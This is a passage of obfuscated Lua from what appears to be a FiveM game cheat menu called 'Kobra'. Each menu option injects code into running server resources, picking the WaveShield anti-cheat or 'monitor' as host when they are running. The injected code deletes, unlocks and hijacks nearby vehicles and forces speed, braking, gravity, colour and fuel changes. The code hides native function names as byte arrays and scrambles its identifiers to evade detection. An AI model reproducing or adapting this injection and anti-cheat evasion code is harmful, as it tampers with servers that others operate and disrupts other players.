                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end end},{type="button",label="Delete Vehicle",onSelect=function() local v447=0 + 0 ;while true do if (v447==(0 + 0)) then v12:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v448=0 + 0 ;while true do if (v448==(0 -0)) then v12:Notify("success","Kobra","Deleted Vehicle",2779 + 221 );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() v12:Notify("success","Kobra","Teleported into Vehicle",3000);MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v449) if v449 then local v620=0;while true do if ((0 + 0)==v620) then v12:Notify("success","Kobra","Boost Vehicle On",166 + 2834 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end break;end end else v12:Notify("error","Kobra","Boost Vehicle Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v450) local v451=0 -0 ;local v452;local v453;while true do if (v451==(1 + 0)) then if v450 then if v452 then local v1026=0 + 0 ;while true do if (v1026==(0 + 0)) then v12:Notify("success","Kobra","Instant Brakes On",3889 -(844 + 45) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v48(v453,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",3000);end elseif v452 then v12:Notify("success","Kobra","Instant Brakes Off",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);else local v1027=0;while true do if (v1027==(284 -(242 + 42))) then v48(v453,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",3000);break;end end end break;end if (v451==0) then v452=GetResourceState("WaveShield")=="started" ;v453=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v451=1;end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v454) local v455=GetResourceState("WaveShield")=="started" ;local v456=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v454 then if v455 then local v793=0 -0 ;while true do if (v793==0) then v12:Notify("success","Kobra","Easy Handling On",6974 -3974 );MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v794=0;while true do if (v794==(1200 -(132 + 1068))) then v48(v456,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",3000);break;end end end elseif v455 then local v795=0;while true do if (v795==(0 -0)) then v12:Notify("success","Kobra","Easy Handling Off",4623 -(214 + 1409) );MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);break;end end else local v796=0 + 0 ;while true do if (v796==(1634 -(497 + 1137))) then v48(v456,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3940 -(9 + 931) );break;end end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v457) local v458=0 + 0 ;local v459;while true do if (v458==(0 -0)) then v459=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v457 then local v851=0 -0 ;while true do if (0==v851) then v12:Notify("success","Kobra","Rainbow Vehicle On",708 + 2292 );if (GetResourceState("WaveShield")=="started") then local v1199=0;while true do if (v1199==(0 + 0)) then print("souygdfg");v48(v459,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);break;end end else v48(v459,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end break;end end else local v852=476 -(296 + 180) ;while true do if (v852==0) then v12:Notify("error","Kobra","Rainbow Vehicle Off",4403 -(1183 + 220) );if (GetResourceState("WaveShield")=="started") then local v1200=0;while true do if (v1200==0) then print("swave");v48(v459,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v48(v459,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end break;end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v460) if v460 then local v621=0 -0 ;while true do if (v621==(0 -0)) then v12:Notify("success","Kobra","Unlimited Fuel On",10250 -7250 );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);break;end end else local v622=734 -(527 + 207) ;while true do if (v622==(527 -(187 + 340))) then v12:Notify("error","Kobra","Unlimited Fuel Off",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
